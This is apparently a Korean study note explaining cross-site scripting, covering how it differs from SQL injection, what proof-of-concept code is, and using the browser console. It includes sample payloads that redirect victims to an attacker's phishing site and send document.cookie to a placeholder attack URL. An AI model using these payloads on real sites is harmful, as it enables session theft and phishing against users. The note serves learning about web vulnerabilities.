# XSS 공격 정리

## Cross Site Scripting
크로스 사이트 스크립팅.

SQL Injection과 함께 웹 상에서 가장 기초적인 취약점 공격 방법의 일종으로, 악의적인 사용자가 공격하려는 사이트에 스크립트를 넣는 기법을 말한다.
</br>
</br>

## Server Side vs CLient Side

```
Server Side   
-> 서버에서 실행되는 코드    
(php)   

Clinet Side   
-> 클라이언트 측에서 실행되는 코드   
(웹 브라우저)

SQLi = Server Side
XSS  = Client Side 
```

XSS는 클라이언트 측 코드를 삽입하는 공격이다.   
이용자(피해자)의 웹 브라우저에서 실행되게 만드는 공격.   
서버에는 아무 영향을 주지 않는 것이 특징이다.
</br>
</br>

SQL Injection = 대표적인 서버를 공격하는 방법   
XSS           = 웹 사이트를 쓰는 이용자들을 공격하는 방법

XSS 는 HTML, Javascript를 통해서 공격한다.
</br>
</br>

---
## XSS, POC 코드(증명용 코드)

1. 웹 브라우저에서 F12를 눌러 개발자 모드를 연다.   
![1](https://user-images.githubusercontent.com/106296883/236417360-b04e80d0-7da3-4c15-ab15-0590ddf0bd9c.PNG)


2. Console 탭을 누른다.   
![2](https://user-images.githubusercontent.com/106296883/236417518-6ad761eb-0c00-4c0c-8855-22f833360448.PNG)


3. POC 코드를 삽입한다.   
const, let, var 등 사용   
![3](https://user-images.githubusercontent.com/106296883/236417870-c8169e5d-6aa2-4a65-8104-cb360abe10ff.PNG)   
![4](https://user-images.githubusercontent.com/106296883/236417875-6a321e14-0f86-4c27-a1fd-8157a76b046d.PNG)

</br>

POC 코드(Proof of Concept)   
- 사전적 의미 : 개념 증명(POC)은 기존 시장에 없었던 신기술을 도입하기 전에 이를 검증하기 위해 사용하는 것을 의미.
- 보안 업무에서 POC 코드란 취약점을 이용한 공격이 가능함을 보여주는 시현 소스코드의 의미.
- 취약점을 사용할 수 있다는 것만 증명하면 되기 때문에 필요한 내용으로만 작성된 코드로 간단하게 작성된다. 
</br>
</br>

```
<페이지 이동>


location.herf = "공격자 피싱 사이트";
location.replace = "공격자 피싱 사이트";
```
```
<Web Request>


var i = new Image();
i.src = "attack URL?cookie=" + document.cookie

---

var i = new Image();   
=>   
<img   > 의미.

i.src = "attack URL?cookie=" + document.cookie   
=> 
src=''

==>
<img src="attack URL?cookie=" + document.cookie>
```


```
<Keylogger>
```
```
<Crypto miner>
```
</br>
</br>



